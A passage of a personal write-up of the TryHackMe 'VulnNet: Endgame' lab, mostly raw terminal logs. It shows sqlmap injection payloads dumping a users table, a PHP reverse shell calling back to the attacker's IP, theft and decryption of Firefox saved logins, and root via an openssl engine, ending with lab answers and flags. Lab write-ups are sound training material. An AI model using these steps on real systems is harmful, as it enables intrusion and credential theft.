back-end DBMS: MySQL >= 5.0.12
[14:21:54] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[14:21:54] [INFO] fetching columns for table 'users' in database 'blog'
[14:21:54] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+

[14:21:54] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 14:21:54 /2023-04-21/

                                                                                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=5" --dbs --batch --random-agent --threads=10 -D blog -T users -C username,password --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:22:13 /2023-04-21/

[14:22:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[14:22:13] [INFO] resuming back-end DBMS 'mysql' 
[14:22:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 5223=5223

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 9248 FROM (SELECT(SLEEP(5)))reeW)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9227 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717a71,0x52636969624361636476664b62614565724d6f7a6f6c5076736e4671786c5176655467614b574e51,0x7170707871)-- -
---
[14:22:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[14:22:14] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[14:22:14] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'blog'
[14:22:14] [WARNING] reflective value(s) found and filtering out
Database: blog
Table: users
[651 entries]
+--------------------+---------------------+
| username           | password            |
+--------------------+---------------------+
[14:22:15] [WARNING] console output will be trimmed to last 256 rows due to large table size
| lspikinsaz         | D8Gbl8mnxg          |
| profeb0            | kLLxorKfd           |
| sberrymanb1        | cdXAJAR             |
| ajefferiesb2       | 0hdeFiZBRJ          |
| hkibblewhiteb3     | 6rl6qXSJDrr         |
| dtremayneb4        | DuYMuI              |
| bflewinb5          | fwbk0Vgo            |
| kmolineuxb6        | 92Fb3vBF5k75        |
| fjosefsb7          | zzh9wheBjX          |
| tmiskellyb8        | sAGTlyBrb5r         |
| nallrightb9        | 3uUPdL              |
| hlevermoreba       | fp2LW0x             |
| celgerbb           | IKhg7D              |
| frustedbc          | Tjyu2Ch2            |
| imeneghibd         | NgKgdeKRVEK         |
| vgouninbe          | wGWMg3d             |
| cbartoschbf        | ruTxBc2n85          |
| lcordonbg          | ZydELwZFV2          |
| dappsbh            | ROfVmvZSYS          |
| zduchanbi          | B4SBGt5yAD          |
| jfraybj            | zhE95JJX9l          |
| mlanchesterbk      | nXSVHhVW9S          |
| cgylesbl           | NCeU070             |
| cbonnifacebm       | WzkvfoedkXJx        |
| btoppasbn          | ktPBpK1             |
| mdurrettbo         | 8fCXE6BF9gj         |
| skilroybp          | cSAjOy              |
| uvonderemptenbq    | HLUHZ9oQ            |
| dvinsenbr          | gTc7TiSsd2          |
| ltiltbs            | 7yQ0b1B             |
| dsimcoebt          | SXD1eC6ysa          |
| wfrailbu           | bgb084kq            |
| lmityukovbv        | NsJFz4DLpI          |
| vkellarbw          | 7JVPatN             |
| rkingstonbx        | yuTnSPEvIoJ4        |
| rbakewellby        | L3ttm8              |
| dbousteadbz        | vyae6t              |
| vstaddenc0         | iA4AD4UlcLF1        |
| rwhacketc1         | VlyIAh              |
| tnoorc2            | IpsnIEbIaT          |
| dduffync3          | UPU9rZu8q           |
| dstichelc4         | xuUXUFXoc           |
| kcleverlyc5        | yTuqouj9ZK          |
| sreinertc6         | QDneobZ1DH          |
| mcottinghamc7      | OdrnoHtrP           |
| ljansemac8         | c3KvR6              |
| acodac9            | GMbFP9              |
| rhuggardca         | zIZ11OPuj           |
| gkeechcb           | XCX2GVx             |
| syurincc           | nJQgYR2uOyZq        |
| agaulecd           | AQlFlPvf            |
| wboijce            | zj6vR6Bf            |
| kphifercf          | eL5uJnLD2           |
| abenglecg          | 7HEMdTc07           |
| emarkingch         | VbzVZoYn            |
| nmuldowneyci       | wln8WN3PJ           |
| jbygrovecj         | 3AcKBTHRN           |
| bduxburyck         | 32ZXql9Uw8          |
| fthewcl            | 2pnBsk6i            |
| kmeececm           | JxcEXKAN            |
| bholligancn        | rkyCMLwOIt          |
| bferonetco         | KlxQ4Vxl            |
| jcraycp            | OFc5f2              |
| hethertoncq        | SsLMTxbw            |
| cclayecr           | nUpdnCZW1cqr        |
| tmcbreartycs       | 0I7ldSNbm           |
| oderuggieroct      | gqQeawiZ            |
| rdoerscu           | djQBjW3pk           |
| karbucklecv        | G9FarmKd            |
| bbuckbycw          | lXCoFI              |
| ldixseecx          | WAMRuFTTI3          |
| jmahedycy          | diVq6PDeEpz         |
| gdamrellcz         | bV6cXPOFfLg         |
| sgarrettd0         | dCrF5fv             |
| plaurenceaud1      | Q4gYmlM             |
| kmcgeacheyd2       | SnvFrSB6AB          |
| mhopewelld3        | qiehVyQ             |
| chottond4          | At9A4aCJos          |
| hsellandd5         | 8T9v08352re         |
| syegorkovd6        | y8chyGC9js          |
| adavisond7         | ghMz6e68c1Z         |
| amewisd8           | 00S7q8S1f8W         |
| lorpind9           | 2rruluVz0SwY        |
| jbilovskyda        | hXaVYfHUZoz         |
| jhalforddb         | j7GAP4v             |
| wcolisbedc         | 0MM46yTEVBL2        |
| cgreastydd         | QUDViFUxO           |
| ajackde            | YGcBpM              |
| cmcgarritydf       | 2js9AM              |
| tjostdg            | oJ38KUXgm           |
| lguidendh          | KP9DmIk             |
| mbletsodi          | qNYURfhw            |
| wsneesbydj         | jDmbnZJi            |
| glerouxdk          | t8xlAuAvH8Yj        |
| yhaythornthwaitedl | TTin1up             |
| nzmitrovichdm      | 0ftVkbqP            |
| jgodballdn         | Kwcozh              |
| jkiddeydo          | TWnwDTB             |
| acaghandp          | IxQgXLrw            |
| rattestonedq       | AxuOsAA0lqrc        |
| mmichallatdr       | GCpyVf              |
| rgaitoneds         | YnPCjKg             |
| krobbekedt         | NOYhOlnC            |
| nknollerdu         | pjSBcAVD            |
| wshemeltdv         | 5RigTGe             |
| rpeperelldw        | jwKMTMu             |
| lbescobydx         | 4qfwbKNed3I         |
| jparishdy          | qSX9N1Kf8XJ         |
| jminghidz          | AoIrka              |
| nforthe0           | Ft4xVROXXCd5        |
| tklemensiewicze1   | x3WIaoX99yb         |
| epotterye2         | hXcrFv              |
| lbrugmanne3        | 6ZtJhp4col          |
| adencse4           | bqItfg4wf           |
| cfloreze5          | 5W4lM81DPo          |
| amatanine6         | IT6p5HT             |
| fchalkere7         | 0Q6T9jvAZB          |
| rytere8            | M7lvtAz6oRNS        |
| cstillee9          | MpO7FgPoz           |
| cbashamea          | 8rIuhW0VZ           |
| flyeseb            | OS15i4              |
| gtieryec           | Usl7mH2H            |
| sborgheseed        | WDAliOAKFj7f        |
| hmctrustyee        | iwpk0YC             |
| wvigeref           | lN8d6g1             |
| nbockeneg          | nuwPbeTIgX8F        |
| ffranzmaneh        | LvBDyc9JRPV         |
| drippingaleei      | ncpiXJX             |
| achambersej        | vQUTz2xEyWx4        |
| fsuarezek          | wQcbURC             |
| kaspoleel          | irTEDl2k            |
| mmursellem         | H6WyTMdy            |
| szecchinellien     | pukixtg             |
| cnewlineo          | Or6dtgSGmd          |
| cmccrowep          | VhkvlZO             |
| shavershameq       | slncO0kvmb          |
| jtumeltyer         | svJ4749mzdJ         |
| cmathivates        | weR5eukJOX6C        |
| btarzeyet          | rp8sqUpw            |
| fstedmaneu         | 8T7UFX              |
| mgaitoneev         | SkuuzEsAZ           |
| zscotlandew        | RIs9MA              |
| dfurbyex           | ttKwcGDELB          |
| sdallowey          | PVVOkQqHVdU         |
| lmccormackez       | Szh74h              |
| arenneyf0          | wMkLVr0             |
| lbodegaf1          | 4Bux8MCHXS          |
| rsantostefanof2    | ZXIOChbv            |
| mvaissieref3       | PcJPLBJf            |
| csolwayf4          | kgjhKzMWYakS        |
| pwaddingtonf5      | p69xguJZe           |
| kchaffeyf6         | ntswwsY             |
| zgooblef7          | lh0Llscj            |
| pwassf8            | uqzWk2PYLJR7        |
| bmcclenaghanf9     | eIZQxLh             |
| bhaddintonfa       | IDp96W1RUb          |
| rblesingfb         | Z7MGodFb            |
| mblownefc          | caw1QQ1             |
| lwhitlandfd        | QpPSspEWus          |
| lgoftonfe          | u6ZBlHvmId          |
| vdubbleff          | BvZ0JJNVWCX         |
| dfrenschfg         | Ih1thIl             |
| gofarrisfh         | jmjhYpmgg           |
| kpipkinfi          | LFXCNqt5hN          |
| sshilstonfj        | tofKHos             |
| lstanistreetfk     | fCMRSGm4BzNQ        |
| ktomasellifl       | zFdwNg16yCdB        |
| fmarkhamfm         | qJhjNz0sK7Z         |
| bledingtonfn       | wmd4CD60            |
| yzettoifo          | mZjvZC              |
| coganfp            | 7MeBiB7             |
| sdibollfq          | VCV8FqINn           |
| blampkinfr         | OsZxivx             |
| mfachefs           | HVBEN4              |
| kburelft           | m9R8setEC           |
| bgrimsdithfu       | q1SivtRlbetm        |
| ctolemanfv         | fRnopRDUrds         |
| awhiteheadfw       | eZ3TzXtdD           |
| mchislettfx        | Uh2kDLMNFeej        |
| lreichardtfy       | Ln6WDY              |
| bjossfz            | kGBl9CgCPcGF        |
| hprevostg0         | TuK60tJ             |
| rpritchettg1       | mwTGls              |
| dantonssong2       | Ym2cHtkuW           |
| gmantrupg3         | axZcgE9T            |
| dsimioneg4         | 6LFtl39ggEtI        |
| lmiddleg5          | 79hJw4u             |
| amcquorkelg6       | UdPazP              |
| mellwandg7         | hFdDjfcdwCja        |
| ddunbobing8        | w9Copz4             |
| cszabog9           | K67Hs5              |
| cdorbonga          | molOCywSVk          |
| fridgwellgb        | wWQpqk              |
| ksiregc            | Ipmq9QvTymr         |
| hwhardleygd        | 7v4eltt3Kuw         |
| hpoppletonge       | ctvNF49tuT          |
| aghidoligf         | hFgxHo5Xp           |
| fstilinggg         | g4St9w              |
| ebodechongh        | DTSos9KOFhIO        |
| rbennellickgi      | 0lj1adMG            |
| gnaldergj          | kNEDmUrVp           |
| preygk             | 8kt6CKNTc           |
| cjigglegl          | Khmoz3bGQiwo        |
| aburgisgm          | 2UrQCd16gtqN        |
| nluddygn           | yQrAEzZxK           |
| lcluttengo         | TeFpfcTSt4K         |
| laseefgp           | Q8vHxue1            |
| wdovergq           | 8sNg5H              |
| bjackesgr          | BB2ymU              |
| sphebeygs          | CTCPBoG             |
| hhushergt          | KoM1f3mmxlC         |
| dmowatgu           | H9fzdE              |
| vgoodhandgv        | OQ4Axwb             |
| vcocktongw         | zo9YGPcnoFY         |
| afrackiewiczgx     | wNfgrMLd92          |
| wmccorkellgy       | L70zF2              |
| mbaldersongz       | vjlPxrlrB1          |
| jdovingtonh0       | 1fDBrk              |
| tlunneyh1          | NVQobq              |
| lwaulkerh2         | 4IHZylSa6uSk        |
| nceccolih3         | 6mqTbfJcyB          |
| aworsnuph4         | BtdoQGpOg           |
| pwheelhouseh5      | HA5wRx2Xkt          |
| ashearsh6          | rsQIXNF4p56t        |
| bhendriksh7        | DD87MyB             |
| tgrovierh8         | EqEt2NXw37Q         |
| kspanswickh9       | oN9I8Sf             |
| krattrayha         | HkZs0YLv            |
| anorcockhb         | LTSB3oaxy9          |
| kneathc            | 2lOIMadSDW2         |
| ajaggarhd          | 2YDcmeZaKwig        |
| krossbrookehe      | 7pA32uFwx8eh        |
| lpavelhf           | yoWnriWXeTc         |
| agaitskillhg       | OglY7vT0Pyn         |
| bmylechreesthh     | GBCtL62Xa           |
| hsimenothi         | JdHOJPdpZV          |
| bbrunihj           | PT8RllCQ            |
| sroysonhk          | bJR3DOVL            |
| bmarrinerhl        | yoJwhOI             |
| ataillanthm        | tfncTGLw            |
| acassamhn          | dBcYuQwU            |
| kfruchonho         | s6QjWpLo            |
| kdenyakinhp        | LTbmsk6T            |
| mhundyhq           | xrbjFjA8p           |
| zcatchesidehr      | gaMmTSLHkMZE        |
| anorcrosshs        | VH3FsbYfk           |
| kklavesht          | YY6hmavoD           |
| bloghanhu          | kElKt4              |
| ekayzerhv          | 4eHrdt5Z            |
| jovenhw            | 2QZrPJ2             |
| gboayshx           | t0xmZtLTXa          |
| asuermeiershy      | 09jD21OoQ           |
| msambidgehz        | OBJZD6f             |
| bhuertai0          | Cc4QOkuSvrF         |
| oboatmani1         | kSKBUj8             |
| rtamblingi2        | BIkqvmX             |
+--------------------+---------------------+

[14:22:15] [INFO] table 'blog.users' dumped to CSV file '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
[14:22:15] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/api.vulnnet.thm'

[*] ending @ 14:22:15 /2023-04-21/

finding and replacing

──(witty㉿kali)-[~/Downloads]
└─$ more pass_vulnnet 
NlmSXelwUsx
nlteUMEMNyiV
nMf6vluECN
NOYhOlnC
NPkTWDNoCp7
NQ5Lcl2e
nrHPTvxiUdI
nrvQhK1zbr
NsJFz4DLpI
ntswwsY
nUpdnCZW1cqr
...


let's use wordlist with john

┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/home/witty/Downloads/pass_vulnnet vulnnet_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (argon2 [Blake2 AVX])
Cost 1 (t) is 16 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vAxWtmNzeTz      (?)     
1g 0:00:01:17 DONE (2023-04-21 14:29) 0.01289g/s 2.476p/s 2.476c/s 2.476C/s TTin1up..X8ssVQ9pBBqwqCegrU4
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

chris_w:vAxWtmNzeTz

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php                                 
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

Go to filelist and upload it but Filename "payload_ivan.php" is not allowed!

https://typo3.org/article/typo3-psa-2019-010

-   _TYPO3_CONF_VARS/BE/fileDenyPattern_ (used to deny uploads of those file extensions in the backend and in frontend applications using File Abstraction Layer API)
    -   might be extended with _html|htm|js|css|svg_
    -   (example: _\.(php[3-7]?|phpsh|phtml|pht|phar|shtml|cgi|html|htm|js|css|svg)(\..*)?$|\.pl$|^\.htaccess$_ )

Go to Setting -> Configure Installation-Wide Options -> [BE][fileDenyPattern] and remove it then write configuration

now we can upload our revshell, after uploading go to http://admin1.vulnnet.thm/fileadmin/ and press ur revshell file

or just 

curl http://admin1.vulnnet.thm/fileadmin/payload_ivan.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.246.2] 44902
SOCKET: Shell has connected! PID: 2444
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@vulnnet-endgame:/var/www/admin1/fileadmin$ 

╔══════════╣ Files inside others home (limit 20)
/home/system/.ICEauthority
/home/system/.mozilla/firefox/2o9vd4oi.default/times.json

https://support.mozilla.org/en-US/questions/1352064

www-data@vulnnet-endgame:/home/system/.mozilla/firefox$ ls -laR
ls -laR
.:
total 36
drwxr-xr-x  7 system system 4096 Jun 14  2022  .
drwxr-xr-x  4 system system 4096 Jun 14  2022  ..
drwxr-xr-x 13 system system 4096 Jun 14  2022  2fjnrwth.default-release
drwxr-xr-x  2 system system 4096 Jun 14  2022  2o9vd4oi.default
drwxr-xr-x 13 system system 4096 Jun 14  2022  8mk7ix79.default-release
drwxr-xr-x  3 system system 4096 Jun 14  2022 'Crash Reports'
drwxr-xr-x  2 system system 4096 Jun 14  2022 'Pending Pings'
-rwxr-xr-x  1 system system   62 Jun 14  2022  installs.ini
-rwxr-xr-x  1 system system  259 Jun 14  2022  profiles.ini

./2fjnrwth.default-release:
total 12192
drwxr-xr-x 13 system system    4096 Jun 14  2022 .
drwxr-xr-x  7 system system    4096 Jun 14  2022 ..
-rwxr-xr-x  1 system system       0 Jun 14  2022 .parentlock
-rwxr-xr-x  1 system system    6172 Jun 14  2022 AlternateServices.txt
-rwxr-xr-x  1 system system     987 Jun 14  2022 SiteSecurityServiceState.txt
-rwxr-xr-x  1 system system    4860 Jun 14  2022 addonStartup.json.lz4
-rwxr-xr-x  1 system system      24 Jun 14  2022 addons.json
drwxr-xr-x  2 system system    4096 Jun 14  2022 bookmarkbackups
-rwxr-xr-x  1 system system     216 Jun 14  2022 broadcast-listeners.json
-rwxr-xr-x  1 system system  229376 Jun 14  2022 cert9.db
-rwxr-xr-x  1 system system     163 Jun 14  2022 compatibility.ini
-rwxr-xr-x  1 system system     939 Jun 14  2022 containers.json
-rwxr-xr-x  1 system system  229376 Jun 14  2022 content-prefs.sqlite
-rwxr-xr-x  1 system system  524288 Jun 14  2022 cookies.sqlite
drwxr-xr-x  3 system system    4096 Jun 14  2022 crashes
drwxr-xr-x  4 system system    4096 Jun 14  2022 datareporting
-rwxr-xr-x  1 system system       2 Jun 14  2022 enumerate_devices.txt
-rwxr-xr-x  1 system system    1219 Jun 14  2022 extension-preferences.json
-rwxr-xr-x  1 system system   40526 Jun 14  2022 extensions.json
-rwxr-xr-x  1 system system 5242880 Jun 14  2022 favicons.sqlite
drwxr-xr-x  3 system system    4096 Jun 14  2022 features
-rwxr-xr-x  1 system system  262144 Jun 14  2022 formhistory.sqlite
drwxr-xr-x  3 system system    4096 Jun 14  2022 gmp-gmpopenh264
-rwxr-xr-x  1 system system     410 Jun 14  2022 handlers.json
-rwxr-xr-x  1 system system  294912 Jun 14  2022 key4.db
-rwxr-xr-x  1 system system     658 Jun 14  2022 logins.json

m/.mozilla/firefox/2fjnrwth.default-release$ pwd
pwd
/home/system/.mozilla/firefox/2fjnrwth.default-release
</system/.mozilla/firefox/2fjnrwth.default-release$ cat logins.json
cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://tryhackme.com","httpRealm":null,"formSubmitURL":"https://tryhackme.com","usernameField":"email","passwordField":"password","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECGTdteVlY+xxBBjfIPYRG22oqSkatzSobyWk2xPX4TiOOKE=","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHu6efDMbAwDBBjp+XbxLGvfpavdVwdpPFupNpNwheQ+A5Y=","guid":"{8fa24ee9-208e-41f9-a718-eb6a770d70b8}","encType":1,"timeCreated":1654970290415,"timeLastUsed":1654970290415,"timePasswordChanged":1654970290415,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}

https://github.com/unode/firefox_decrypt

┌──(witty㉿kali)-[~/Downloads]
└─$ locate firefox_decrypt.py                              
/home/witty/Downloads/firefox_decrypt/firefox_decrypt.py



</system/.mozilla/firefox/2fjnrwth.default-release$ zip -r /tmp/browser.zip /home/system/.mozilla/
zip warning: Not all files were readable
  files/entries read:  239 (49M bytes)  skipped:  18 (139K bytes)

</system/.mozilla/firefox/2fjnrwth.default-release$ cd /tmp
cd /tmp
www-data@vulnnet-endgame:/tmp$ ls
ls
browser.zip  linpeas.sh
www-data@vulnnet-endgame:/tmp$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [21/Apr/2023 15:10:40] "GET /browser.zip HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ mkdir vulnnet_firefox              
                                                                                               
┌──(witty㉿kali)-[~/Downloads]
└─$ cd vulnnet_firefox 
                                                                                               
┌──(witty㉿kali)-[~/Downloads/vulnnet_firefox]
└─$ wget http://10.10.246.2:8000/browser.zip   
--2023-04-21 15:10:40--  http://10.10.246.2:8000/browser.zip
Connecting to 10.10.246.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8085604 (7.7M) [application/zip]
Saving to: ‘browser.zip’

browser.zip             100%[==============================>]   7.71M   647KB/s    in 17s     

2023-04-21 15:10:57 (474 KB/s) - ‘browser.zip’ saved [8085604/8085604]

┌──(witty㉿kali)-[~/Downloads/vulnnet_firefox]
└─$ unzip browser.zip

┌──(witty㉿kali)-[~/Downloads/vulnnet_firefox]
└─$ ls
browser.zip  home

┌──(witty㉿kali)-[~/…/system/.mozilla/firefox/2fjnrwth.default-release]
└─$ pwd                                                             
/home/witty/Downloads/vulnnet_firefox/home/system/.mozilla/firefox/2fjnrwth.default-release

┌──(witty㉿kali)-[~/…/system/.mozilla/firefox/2fjnrwth.default-release]
└─$ more logins.json                                      
{"nextId":2,"logins":[{"id":1,"hostname":"https://tryhackme.com","httpRealm":null,"formSubmitUR
L":"https://tryhackme.com","usernameField":"email","passwordField":"password","encryptedUsernam
e":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECGTdteVlY+xxBBjfIPYRG22oqSkatzSobyWk2xPX4TiOOKE
=","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHu6efDMbAwDBBjp+XbxLGvfpav
dVwdpPFupNpNwheQ+A5Y=","guid":"{8fa24ee9-208e-41f9-a718-eb6a770d70b8}","encType":1,"timeCreated
":1654970290415,"timeLastUsed":1654970290415,"timePasswordChanged":1654970290415,"timesUsed":1}
],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}

┌──(witty㉿kali)-[~/…/system/.mozilla/firefox/2fjnrwth.default-release]
└─$ python3 /home/witty/Downloads/firefox_decrypt/firefox_decrypt.py /home/witty/Downloads/vulnnet_firefox/home/system/.mozilla/firefox/2fjnrwth.default-release
2023-04-21 15:13:46,165 - WARNING - profile.ini not found in /home/witty/Downloads/vulnnet_firefox/home/system/.mozilla/firefox/2fjnrwth.default-release
2023-04-21 15:13:46,166 - WARNING - Continuing and assuming '/home/witty/Downloads/vulnnet_firefox/home/system/.mozilla/firefox/2fjnrwth.default-release' is a profile location

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8y7TKQDpucKBYhwsb'

system:8y7TKQDpucKBYhwsb

┌──(witty㉿kali)-[~/…/system/.mozilla/firefox/2fjnrwth.default-release]
└─$ ssh system@10.10.246.2    
The authenticity of host '10.10.246.2 (10.10.246.2)' can't be established.
ED25519 key fingerprint is SHA256:UwSqcCjp07h7qqubWx22AY0AsygwXw11Ii1arCJSLyA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.246.2' (ED25519) to the list of known hosts.
system@10.10.246.2's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

Your Hardware Enablement Stack (HWE) is supported until April 2023.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

system@vulnnet-endgame:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Utils  Videos
system@vulnnet-endgame:~$ cat user.txt
THM{fb84e79072015186c72ec77ded49a5ff}
system@vulnnet-endgame:~$ getcap -r / 2>/dev/null
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

https://dozer.nz/posts/openssl-arginjection

┌──(witty㉿kali)-[~/Downloads]
└─$ locate engine.so
/home/witty/Downloads/engine.so

visit mindgames is the same method :)

system@vulnnet-endgame:/tmp$ wget http://10.8.19.103:1234/engine.so
--2023-04-21 15:20:00--  http://10.8.19.103:1234/engine.so
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15712 (15K) [application/octet-stream]
Saving to: ‘engine.so’

engine.so               100%[==============================>]  15.34K  80.8KB/s    in 0.2s    

2023-04-21 15:20:01 (80.8 KB/s) - ‘engine.so’ saved [15712/15712]

system@vulnnet-endgame:/tmp$ chmod +x engine.so
cd /home/system/Utils/
ls
openssl  unzip  zip
system@vulnnet-endgame:/tmp$ /home/system/Utils/openssl req -engine ./engine.so
root@vulnnet-endgame:/tmp# cd /root
root@vulnnet-endgame:/root# ls
snap  thm-flag
root@vulnnet-endgame:/root# cd thm-flag/
root@vulnnet-endgame:/root/thm-flag# ls
root.txt
root@vulnnet-endgame:/root/thm-flag# cat root.txt 
THM{1d42edbb03c0b287a8d0d8a265dce012}

```
![[Pasted image 20230421124510.png]]
![[Pasted image 20230421124829.png]]
![[Pasted image 20230421125350.png]]
![[Pasted image 20230421132601.png]]
![[Pasted image 20230421133644.png]]
![[Pasted image 20230421134037.png]]
![[Pasted image 20230421134333.png]]
![[Pasted image 20230421134454.png]]

What is the password of the CMS administrator?

*vAxWtmNzeTz*

What is the user flag?  

*THM{fb84e79072015186c72ec77ded49a5ff}*

What is the root flag?

*THM{1d42edbb03c0b287a8d0d8a265dce012}*

[[Surfer]]